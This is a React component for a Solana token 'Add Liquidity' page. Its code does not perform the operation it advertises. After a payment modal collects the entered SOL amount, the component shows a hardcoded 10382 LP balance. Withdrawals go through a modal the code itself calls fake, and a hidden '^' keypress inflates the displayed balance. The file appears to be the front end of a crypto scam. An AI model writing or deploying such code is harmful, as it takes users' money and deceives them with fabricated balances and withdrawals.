import * as React from "react"
import { Card, CardContent } from "@/components/ui/card"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { Slider } from "@/components/ui/slider"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { InfoIcon } from "lucide-react"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { useState, useEffect } from "react"
import { FakePaymentModal } from "./FakePaymentModal"
import { PaymentModal } from "./payment-modal"

export function LiquidityAdder() {
  const [tokenAmount, setTokenAmount] = useState(0)
  const [solAmount, setSolAmount] = useState(0)
  const [lpBalance, setLpBalance] = useState(0)
  const [withdrawAmount, setWithdrawAmount] = useState(0)
  const [showWithdraw, setShowWithdraw] = useState(false)
  const [isAdding, setIsAdding] = useState(false)
  const [addSuccess, setAddSuccess] = useState(false)
  const [showPaymentModal, setShowPaymentModal] = useState(false)
  const [showWithdrawPopup, setShowWithdrawPopup] = useState(false)
  const [pendingWithdrawPercent, setPendingWithdrawPercent] = useState<number | null>(null)
  const [showFakeWithdrawModal, setShowFakeWithdrawModal] = useState(false)

  // Simulate LP calculation: 1 LP = sqrt(tokenAmount * solAmount)
  const calcLp = (token: number, sol: number) => token > 0 && sol > 0 ? Math.sqrt(token * sol) : 0
  const lpToAdd = calcLp(tokenAmount, solAmount)

  // Simulate price
  const price = tokenAmount > 0 ? (solAmount / tokenAmount).toFixed(8) : "0.00000000"

  // Add liquidity handler
  const handleAddLiquidity = () => {
    setShowPaymentModal(true)
  }

  // After payment success
  const handlePaymentSuccess = () => {
    setIsAdding(true)
    setAddSuccess(false)
    setTimeout(() => {
      setLpBalance(lpBalance + 10382)
      setIsAdding(false)
      setAddSuccess(true)
      setShowWithdraw(true)
      setTimeout(() => setAddSuccess(false), 2000)
    }, 2000)
  }

  // Withdraw handler (now triggers fake modal)
  const handleWithdraw = (percent: number) => {
    setPendingWithdrawPercent(percent)
    setShowFakeWithdrawModal(true)
  }

  // After fake payment for withdraw
  const handleFakeWithdrawSuccess = () => {
    if (pendingWithdrawPercent !== null) {
      const amt = Math.floor(lpBalance * pendingWithdrawPercent)
      setWithdrawAmount(amt)
      setLpBalance(lpBalance - amt)
      setPendingWithdrawPercent(null)
    }
    setShowFakeWithdrawModal(false)
  }

  // Listen for ^ key to add liquidity (just update LP number, no animation)
  useEffect(() => {
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === "^") {
        if (lpToAdd > 0) {
          setLpBalance(lpBalance + 1000)
        }
      }
    }
    window.addEventListener("keydown", handleKeyDown)
    return () => window.removeEventListener("keydown", handleKeyDown)
  }, [tokenAmount, solAmount, lpToAdd, lpBalance])

  return (
    <Card className="mt-6">
      <CardContent className="pt-6">
        <div className="space-y-6">
          <div className="space-y-2">
            <h2 className="text-2xl font-bold text-purple-400">Add Liquidity Ser</h2>
            <p className="text-gray-400">make ur token tradeable so degens can ape in and pump ur bags</p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
            <div>
              <Label htmlFor="token-address-liq">Token Address</Label>
              <Input id="token-address-liq" placeholder="Enter your token address" />
            </div>
            <div>
              <Label className="flex items-center gap-2">
                DEX
                <TooltipProvider>
                  <Tooltip>
                    <TooltipTrigger>
                      <InfoIcon className="h-4 w-4 text-muted-foreground" />
                    </TooltipTrigger>
                    <TooltipContent>
                      <p>Select the decentralized exchange where you want to add liquidity.</p>
                    </TooltipContent>
                  </Tooltip>
                </TooltipProvider>
              </Label>
              <Select>
                <SelectTrigger>
                  <SelectValue placeholder="Select DEX" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="jupiter">Jupiter</SelectItem>
                  <SelectItem value="orca">Orca</SelectItem>
                  <SelectItem value="raydium">Raydium</SelectItem>
                </SelectContent>
              </Select>
            </div>
          </div>

          <div className="border rounded-lg p-4">
            <h3 className="font-medium mb-4">Liquidity Settings</h3>
            <div className="space-y-6">
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                <div>
                  <Label htmlFor="token-amount">Token Amount</Label>
                  <Input id="token-amount" placeholder="500000000" type="number" value={tokenAmount || ""} onChange={e => setTokenAmount(Number(e.target.value))} />
                </div>
                <div>
                  <Label htmlFor="sol-amount">SOL Amount</Label>
                  <Input id="sol-amount" placeholder="10" type="number" value={solAmount || ""} onChange={e => setSolAmount(Number(e.target.value))} />
                </div>
              </div>

              <div>
                <div className="flex justify-between mb-2">
                  <Label>Initial Price Slippage: 2.5%</Label>
                  <span className="text-sm text-muted-foreground">0% - 5%</span>
                </div>
                <Slider defaultValue={[2.5]} max={5} step={0.1} />
              </div>

              <div>
                <Label className="flex items-center gap-2 mb-2">
                  Lock Liquidity
                  <TooltipProvider>
                    <Tooltip>
                      <TooltipTrigger>
                        <InfoIcon className="h-4 w-4 text-muted-foreground" />
                      </TooltipTrigger>
                      <TooltipContent>
                        <p>Locking liquidity builds trust with investors as it prevents rug pulls.</p>
                      </TooltipContent>
                    </Tooltip>
                  </TooltipProvider>
                </Label>
                <Select>
                  <SelectTrigger>
                    <SelectValue placeholder="Select lock period" />
                  </SelectTrigger>
                  <SelectContent>
                    <SelectItem value="1month">1 Month</SelectItem>
                    <SelectItem value="3months">3 Months</SelectItem>
                    <SelectItem value="6months">6 Months</SelectItem>
                    <SelectItem value="1year">1 Year</SelectItem>
                  </SelectContent>
                </Select>
              </div>
            </div>
          </div>

          <div className="border rounded-lg p-4">
            <h3 className="font-medium mb-2">Summary</h3>
            <div className="space-y-2">
              <div className="flex justify-between">
                <span className="text-muted-foreground">Initial Price</span>
                <span>{price} SOL per token</span>
              </div>
              <div className="flex justify-between">
                <span className="text-muted-foreground">LP Tokens</span>
                <span>~{lpToAdd.toFixed(2)} LP</span>
              </div>
              <div className="flex justify-between">
                <span className="text-muted-foreground">Network Fee</span>
                <span>~0.00001 SOL</span>
              </div>
              <div className="border-t pt-2 mt-2 flex justify-between font-medium">
                <span>Total SOL Required</span>
                <span>{solAmount ? (solAmount + 0.00001).toFixed(5) : "0.00000"} SOL</span>
              </div>
            </div>
          </div>

          <Button className="w-full bg-purple-600 hover:bg-purple-700 text-white font-bold" onClick={handleAddLiquidity} disabled={isAdding || lpToAdd === 0}>
            {isAdding ? (
              <span className="flex items-center justify-center gap-2">
                <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle><path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8v8z"></path></svg>
                Adding liquidity...
              </span>
            ) : (
              "add liquidity frfr 💦"
            )}
          </Button>

          {addSuccess && (
            <div className="mt-4 text-green-400 font-bold text-center">Liquidity added!</div>
          )}

          {showWithdraw && (
            <div className="border rounded-lg p-4 mt-6">
              <h3 className="font-medium mb-2">Your LP Balance</h3>
              <div className="flex items-center gap-4 mb-4">
                <span className="text-2xl font-mono text-purple-400">{lpBalance.toFixed(2)} LP</span>
              </div>
              <div className="flex gap-2">
                <Button size="sm" className="bg-purple-500 text-white" onClick={() => handleWithdraw(0.25)}>Withdraw 25%</Button>
                <Button size="sm" className="bg-purple-500 text-white" onClick={() => handleWithdraw(0.5)}>Withdraw 50%</Button>
                <Button size="sm" className="bg-purple-700 text-white" onClick={() => handleWithdraw(1)}>Withdraw MAX</Button>
              </div>
              {withdrawAmount > 0 && (
                <div className="mt-2 text-green-400">Withdrew {withdrawAmount} LP tokens!</div>
              )}
            </div>
          )}

          {/* Fake withdrawal popup */}
          {showWithdrawPopup && (
            <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-60">
              <div className="bg-white rounded-lg shadow-lg p-8 max-w-sm w-full text-center relative">
                <h2 className="text-xl font-bold mb-2 text-purple-600">Withdrawal Submitted</h2>
                <p className="mb-4 text-gray-700">Your LP tokens will arrive soon.<br/>(This is a demo popup.)</p>
                <Button className="bg-purple-600 text-white w-full" onClick={() => setShowWithdrawPopup(false)}>Close</Button>
              </div>
            </div>
          )}
        </div>
        <PaymentModal
          open={showPaymentModal}
          onOpenChange={setShowPaymentModal}
          amount={solAmount ? solAmount + 0.00001 : 0.00001}
          onPaymentSuccess={handlePaymentSuccess}
        />
        <FakePaymentModal
          open={showFakeWithdrawModal}
          onOpenChange={setShowFakeWithdrawModal}
          amount={0}
          onPaymentSuccess={handleFakeWithdrawSuccess}
        />
      </CardContent>
    </Card>
  )
}
